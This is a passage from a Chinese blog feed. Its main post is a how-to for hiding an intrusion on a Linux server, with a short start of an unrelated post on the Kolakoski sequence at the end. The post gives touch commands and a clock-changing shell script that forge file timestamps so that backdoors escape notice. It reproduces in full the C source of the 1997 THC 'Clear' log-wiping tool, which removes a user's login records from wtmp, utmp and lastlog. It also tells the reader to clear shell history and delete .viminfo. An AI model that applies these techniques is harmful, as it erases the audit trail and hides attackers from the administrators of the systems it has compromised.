    <url>/2018/10/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%97%B6%E7%BB%99%20Linux%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%93%A6%E9%99%A4%E7%97%95%E8%BF%B9%E7%9A%84%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>如果是要长期维持权限的话, 隐蔽自己总是需要的, 就像 <code>Kali Linux</code> 壁纸上的那句 <code>The quieter you become, the more you are able to hear.</code> 一样. 不过大部分操作都需要 <code>root</code> 权限才能完成, 毕竟如果那么轻松就能清除的话也太不安全了.</p>
<a id="more"></a>

<h3 id="0x01-修改文件的更改时间"><a href="#0x01-修改文件的更改时间" class="headerlink" title="0x01 修改文件的更改时间"></a>0x01 修改文件的更改时间</h3><p>通过 <code>ls -la</code> 或者 <code>stat {$filename}</code>, 可以得到文件的修改时间, 如果上后门的话, 这个时间就会暴露这个文件是后门或者被加过后门, 我们可以通过 <code>touch -d {$time} {$filename}</code> 来修改文件的更改 / 访问时间, 比如 <code>touch -d &quot;2004-02-29 16:21:42&quot; test</code>, 就将 <code>test</code> 的更改 / 访问时间改为 <code>2004-02-29 16:21:42</code>. 这样在 <code>ls -la</code> 时就不会被发现. 修改改动时间 (ctime), 比较复杂, 无法直接修改到任意时间, 但可以用下面这个比较丧心病狂的 <code>bash</code> 脚本来间接实现</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">now=$(date)</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$now</span></span><br><span class="line">sudo date --<span class="built_in">set</span>=<span class="string">"Sat May 11 06:00:00 IDT 2013"</span></span><br><span class="line">chmod 777 <span class="variable">$1</span></span><br><span class="line">sudo date --<span class="built_in">set</span>=<span class="string">"<span class="variable">$now</span>"</span></span><br></pre></td></tr></table></figure>

<p>原理是更改系统时间到你想设置的改动时间 (ctime), 然后因为 <code>chmod</code>, 文件改动时间 (ctime) 将变成系统时间, 再将系统时间改回去, 这样就将 <code>ctime</code> 变成了任意你想要的时间. 不过是真的脑洞清奇 233.</p>
<h3 id="0x02-修改-last-w-lastlog-日志"><a href="#0x02-修改-last-w-lastlog-日志" class="headerlink" title="0x02 修改 last, w, lastlog 日志"></a>0x02 修改 <code>last</code>, <code>w</code>, <code>lastlog</code> 日志</h3><p><code>Linux</code> 自带上面这三个指令, 分别对应三个日志, 来记录用户的登录时间, 当前登录的用户和最后一次登录时间. <code>last -&gt; /var/log/wtmp</code>, <code>w -&gt; /var/run/utmp</code>, <code>lastlog -&gt; /var/log/lastlog</code>, 这三个文件一般权限是 <code>664</code>, 也就是说只有 <code>root</code> 才能修改, 所以如果不是 <code>root</code> 的话只能祈祷维护者在登录时不要在意这些信息. 如果是 <code>root</code> 的话, 因为这三个文件都是二进制文件, 修改起来也是很不方便, 不过可以在网上找到一些写好的程序来一键完成, 比如下面这个.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/********************************************************************</span></span><br><span class="line"><span class="comment"> * Clear v1.3b (c) 1997 by van Hauser / [THC] - vh@campus.de        *</span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * CLEAR cleans all defined system logfiles from a user's login     *</span></span><br><span class="line"><span class="comment"> * data. (utmp, wtmp, utmpx, wtmpx and lastlog)                     *</span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * -\&gt; The deletion can't be detected like those done by zap, wipe,  *</span></span><br><span class="line"><span class="comment"> *    etc. CERT's check programs chkwtmp and chklastlog won't work! * </span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * -\&gt; #undef the system logfiles which do not exist on your system  *</span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * -\&gt; Note that this version only deletes the newest entry of the   *</span></span><br><span class="line"><span class="comment"> *    user in the system logfilse.                                  *</span></span><br><span class="line"><span class="comment"> *    Use Clear v1.3a if you want to delete *all* user entries.     *</span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * Don't forget to check the logfiles generated by syslogd !        *</span></span><br><span class="line"><span class="comment"> * And read the article COVER-1.THC from the THC-Magazine #3 on     *</span></span><br><span class="line"><span class="comment"> * more information on how to cover your tracks.                    *</span></span><br><span class="line"><span class="comment"> * It can be found at ftp.giga.or.at /pub/hacker/THC thc-mag3.zip   *</span></span><br><span class="line"><span class="comment"> *                                                                  *</span></span><br><span class="line"><span class="comment"> * If you finally need a good acct handler too, get ah-1_0b.tgz,    *</span></span><br><span class="line"><span class="comment"> * also in the THC-Magazine #3 ...                                  *</span></span><br><span class="line"><span class="comment"> ********************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/file.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pwd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* all systems support utmp and wtmp */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WTMP_NAME <span class="meta-string">"/var/adm/wtmp"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UTMP_NAME <span class="meta-string">"/etc/utmp"</span></span></span><br><span class="line"><span class="comment">/* utmpx and wtmpx are present on Sys VR4 systems. solaris, irix */</span></span><br><span class="line"> <span class="comment">/* </span></span><br><span class="line"><span class="comment"> #define WTMPX_NAME "/var/adm/wtmpx"</span></span><br><span class="line"><span class="comment"> #define UTMPX_NAME "/var/adm/utmpx"</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/* lastlog is present on linux, sunos, solaris, irix, ultrix</span></span><br><span class="line"><span class="comment">   osf, digital unix. Not on hpux and bsdi, freebsd and therelike. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LASTLOG_NAME <span class="meta-string">"/var/adm/lastlog"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TMP_NAME <span class="meta-string">"/tmp/.XthcX.tmp"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LASTLOG_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;lastlog.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WTMPX_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TMPX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utmpx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UTMPX_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> WTMPX_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TMPX</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;utmpx.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _PATH_UTMP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> UTMP_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UTMP_NAME _PATH_UTMP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _PATH_WTMP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> WTMP_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WTMP_NAME _PATH_WTMP</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _PATH_LASTLOG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> LASTLOG_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LASTLOG_NAME _PATH_LASTLOG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> f_in;</span><br><span class="line"><span class="keyword">int</span> f_out;</span><br><span class="line"><span class="keyword">int</span> g_in;</span><br><span class="line"><span class="keyword">int</span> g_out;</span><br><span class="line"></span><br><span class="line"><span class="keyword">signed</span> <span class="keyword">long</span> found = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LASTLOG_NAME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lastlog</span> <span class="title">oldll</span>;</span></span><br><span class="line"><span class="keyword">int</span> check = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_1</span><span class="params">(<span class="keyword">char</span> *who, <span class="keyword">char</span> fileout[<span class="number">100</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utmp</span> <span class="title">utmp_ent</span>;</span></span><br><span class="line">    <span class="keyword">long</span> pos = <span class="number">0L</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((f_out=open(TMP_NAME, O_RDONLY))&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((g_out=open(fileout, O_WRONLY | O_TRUNC ))&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos != <span class="number">-1L</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                lseek(f_out,(<span class="keyword">long</span>) ( (<span class="keyword">long</span>)pos * (<span class="keyword">long</span>)(<span class="keyword">sizeof</span> utmp_ent)), <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (read(f_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (struct utmp)) &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		    pos = <span class="number">-1L</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(utmp_ent.ut_name,who,<span class="built_in">strlen</span>(who)) != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		        write (g_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line">		    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			found--;</span><br><span class="line">                        <span class="keyword">if</span> (found)</span><br><span class="line">                        &#123;</span><br><span class="line">                            write (g_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LASTLOG_NAME</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TMPX</span></span><br><span class="line">                            <span class="keyword">if</span> ((found == <span class="number">1</span>) &amp;&amp; (check))</span><br><span class="line">                            &#123;</span><br><span class="line">                                oldll.ll_time = utmp_ent.ut_time;</span><br><span class="line">                                <span class="built_in">strcpy</span>(oldll.ll_line, utmp_ent.ut_line);</span><br><span class="line">                                <span class="built_in">strcpy</span>(oldll.ll_host, utmp_ent.ut_host);</span><br><span class="line">                             &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">			&#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pos += <span class="number">1L</span>;</span><br><span class="line">                &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    close(f_out);</span><br><span class="line">            close(g_out);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="built_in">printf</span> (<span class="string">"Can't write %s\n"</span>, fileout);</span><br><span class="line">            close(f_out);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Can't find tmp file (admin around?) %s\n"</span>, TMP_NAME);</span><br><span class="line">&#125;    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill_tmp</span><span class="params">(<span class="keyword">char</span> *who, <span class="keyword">char</span> file[<span class="number">100</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utmp</span> <span class="title">utmp_ent</span>;</span></span><br><span class="line">    <span class="keyword">long</span> pos = <span class="number">0L</span>;</span><br><span class="line">    found=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((f_in=open(file,O_RDONLY))&gt;=<span class="number">0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((g_in=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>))&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos != <span class="number">-1L</span>) </span><br><span class="line">            &#123;</span><br><span class="line">                lseek(f_in,(<span class="keyword">long</span>) ( pos * (<span class="keyword">long</span>)(<span class="keyword">sizeof</span>(struct utmp))), <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> ( read(f_in, &amp;utmp_ent, <span class="keyword">sizeof</span> (struct utmp)) &lt;= <span class="number">0</span> ) </span><br><span class="line">                &#123;</span><br><span class="line">                    pos = <span class="number">-1L</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     write (g_in, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line">                     pos += <span class="number">1L</span>;</span><br><span class="line">                     <span class="keyword">if</span> (<span class="built_in">strncmp</span>(utmp_ent.ut_name,who,<span class="built_in">strlen</span>(who)) == <span class="number">0</span>)</span><br><span class="line">  		         found++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            close(f_in);</span><br><span class="line">            close(g_in);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">"Can't write tmp file : %s\n"</span>, TMP_NAME);</span><br><span class="line">            close(f_in);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Can't find %s\n"</span>, file);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TMPX</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">move_2</span><span class="params">(<span class="keyword">char</span> *who, <span class="keyword">char</span> fileout[<span class="number">100</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utmpx</span> <span class="title">utmp_ent</span>;</span></span><br><span class="line">    <span class="keyword">long</span> pos = <span class="number">0L</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((f_out=open(TMP_NAME, O_RDONLY))&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((g_out=open(fileout, O_WRONLY | O_TRUNC ))&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos != <span class="number">-1L</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                lseek(f_out,(<span class="keyword">long</span>) ( (<span class="keyword">long</span>)pos * (<span class="keyword">long</span>)(<span class="keyword">sizeof</span> utmp_ent)), <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (read(f_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (struct utmp)) &lt;= <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		    pos = <span class="number">-1L</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strncmp</span>(utmp_ent.ut_name,who,<span class="built_in">strlen</span>(who)) != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		        write (g_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line">		    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			found--;</span><br><span class="line">                        <span class="keyword">if</span> (found)</span><br><span class="line">                        &#123;</span><br><span class="line">                            write (g_out, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LASTLOG_NAME</span></span><br><span class="line">                            <span class="keyword">if</span> ((found == <span class="number">1</span>) &amp;&amp; (check))</span><br><span class="line">                            &#123;</span><br><span class="line">                                 oldll.ll_time = utmp_ent.ut_xtime;</span><br><span class="line">                                 <span class="built_in">strcpy</span>(oldll.ll_line, utmp_ent.ut_line);</span><br><span class="line">                                 <span class="built_in">strcpy</span>(oldll.ll_host, utmp_ent.ut_host);</span><br><span class="line">                            &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    pos += <span class="number">1L</span>;</span><br><span class="line">                &#125;</span><br><span class="line">	    &#125;</span><br><span class="line">	    close(f_out);</span><br><span class="line">            close(g_out);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	    <span class="built_in">printf</span> (<span class="string">"Can't write %s\n"</span>, fileout);</span><br><span class="line">            close(f_out);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Can't find tmp file (admin around?) %s\n"</span>, TMP_NAME);</span><br><span class="line">&#125;    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill_tmpx</span><span class="params">(<span class="keyword">char</span> *who, <span class="keyword">char</span> file[<span class="number">100</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utmpx</span> <span class="title">utmp_ent</span>;</span></span><br><span class="line">    <span class="keyword">long</span> pos = <span class="number">0L</span>;</span><br><span class="line">    found=<span class="number">0</span>;</span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> ((f_in=open(file,O_RDONLY))&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((g_in=open(TMP_NAME,O_WRONLY | O_CREAT | O_TRUNC, <span class="number">0600</span>))&gt;=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos != <span class="number">-1L</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                lseek(f_in,(<span class="keyword">long</span>)( (<span class="keyword">sizeof</span>(struct utmp)) * pos), <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span> (read (f_in, &amp;utmp_ent, <span class="keyword">sizeof</span> (struct utmp))&lt;=<span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    pos = <span class="number">-1L</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     write (g_in, &amp;utmp_ent, <span class="keyword">sizeof</span> (utmp_ent));</span><br><span class="line">                     pos += <span class="number">1L</span>;</span><br><span class="line">                     <span class="keyword">if</span> (<span class="built_in">strncmp</span>(utmp_ent.ut_name,who,<span class="built_in">strlen</span>(who)) == <span class="number">0</span>)</span><br><span class="line">                         found++;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            close(f_in);</span><br><span class="line">            close(g_in);</span><br><span class="line">	    <span class="keyword">return</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">"Can't write tmp file : %s\n"</span>, TMP_NAME);</span><br><span class="line">            close(f_in);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Can't find %s\n"</span>, file);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">kill_lastlog(<span class="keyword">char</span> *who)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">passwd</span> *<span class="title">pwd</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lastlog</span> <span class="title">newll</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">strlen</span>(oldll.ll_line))</span><br><span class="line">    &#123;</span><br><span class="line">        oldll.ll_time=<span class="number">0</span>;</span><br><span class="line">        <span class="built_in">strcpy</span>(oldll.ll_line, <span class="string">""</span>);</span><br><span class="line">        <span class="built_in">strcpy</span>(oldll.ll_host, <span class="string">""</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> ((pwd=getpwnam(who))!=<span class="literal">NULL</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((f_in=open(LASTLOG_NAME, O_RDWR)) &gt;= <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">            lseek(f_in, (<span class="keyword">long</span>)pwd-&gt;pw_uid * <span class="keyword">sizeof</span> (struct lastlog), <span class="number">0</span>);</span><br><span class="line">            newll.ll_time=oldll.ll_time;</span><br><span class="line">            <span class="built_in">strcpy</span>(newll.ll_line, oldll.ll_line);</span><br><span class="line">            <span class="built_in">strcpy</span>(newll.ll_host, oldll.ll_host);</span><br><span class="line">            write(f_in, (<span class="keyword">char</span> *)&amp;oldll, <span class="keyword">sizeof</span>( oldll ));</span><br><span class="line">            close(f_in);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">"Can't find lastlog in %s\n"</span>, LASTLOG_NAME);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">" Can't find user %s in passwd\n"</span>,who);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> TMP_NAME</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"TMP_NAME not defined. Edit source and recompile ...\n"</span>);</span><br><span class="line">    <span class="keyword">return</span>(<span class="number">1</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc==<span class="number">2</span>) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WTMP_NAME</span></span><br><span class="line">	check=<span class="number">1</span>;</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"wtmp ... "</span>);</span><br><span class="line">        <span class="keyword">if</span> (kill_tmp(argv[<span class="number">1</span>], WTMP_NAME) == <span class="number">0</span>)</span><br><span class="line">            move_1(argv[<span class="number">1</span>], WTMP_NAME);</span><br><span class="line">        check=<span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> WTMPX_NAME</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"wtmpx ... "</span>);</span><br><span class="line">        <span class="keyword">if</span> (kill_tmpx(argv[<span class="number">1</span>], WTMPX_NAME) == <span class="number">0</span>)</span><br><span class="line">            move_2(argv[<span class="number">1</span>], WTMPX_NAME);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UTMP_NAME</span></span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"utmp ... "</span>);</span><br><span class="line">        <span class="keyword">if</span> (kill_tmp(argv[<span class="number">1</span>], UTMP_NAME) == <span class="number">0</span>)</span><br><span class="line">            move_1(argv[<span class="number">1</span>], UTMP_NAME);        </span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UTMPX_NAME</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"utmpx ... "</span>);</span><br><span class="line">        <span class="keyword">if</span> (kill_tmpx(argv[<span class="number">1</span>], UTMPX_NAME) == <span class="number">0</span>)</span><br><span class="line">            move_2(argv[<span class="number">1</span>], UTMPX_NAME);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> LASTLOG_NAME</span></span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>] != <span class="string">""</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"lastlog ... "</span>);</span><br><span class="line">            kill_lastlog(argv[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">if</span> (unlink(TMP_NAME) &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Can't remove %s, do it by hand ... "</span>,TMP_NAME);</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Done!\n"</span>);</span><br><span class="line">        <span class="keyword">if</span> (argv[<span class="number">1</span>] != <span class="string">""</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Last entry cleared from user %s\n"</span>,argv[<span class="number">1</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Usage : %s username\n"</span>,argv[<span class="number">0</span>]);           </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>来自 1997 年的陈年代码, 但编译后仍然可以正常运行, 而且挺好用, 只要你是 <code>root</code>, 运行 <code>./clear root</code>, 直接把三个日志都给清除掉, 非常方便.</p>
<h3 id="0x03-bash-history-和-viminfo"><a href="#0x03-bash-history-和-viminfo" class="headerlink" title="0x03 .bash_history 和 .viminfo"></a>0x03 <code>.bash_history</code> 和 <code>.viminfo</code></h3><p>这两个清除起来比较简单, <code>.viminfo</code> 直接 <code>rm</code> 掉就 ok, 而 <code>.bash_history</code>, 需要在登出时 <code>history -c</code>, 就可以直接还原成刚进来的状态, 不留痕迹.</p>
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>pentest</tag>
      </tags>
  </entry>
  <entry>
    <title>生成柯拉柯斯基序列</title>
    <url>/2018/02/15/%E7%94%9F%E6%88%90%E6%9F%AF%E6%8B%89%E6%9F%AF%E6%96%AF%E5%9F%BA%E5%BA%8F%E5%88%97/</url>
    <content><![CDATA[<p>今天在B站上看到这个<a href="https://www.bilibili.com/video/av19623444/" target="_blank" rel="noopener">https://www.bilibili.com/video/av19623444/</a>, 觉得这个数列蛮有意思, 干脆顺便写个程序来生成好了.  整体上没啥难度, 但是这个数列是真的蛮好玩的, 可以自己描述自己. </p>
<a id="more"></a>

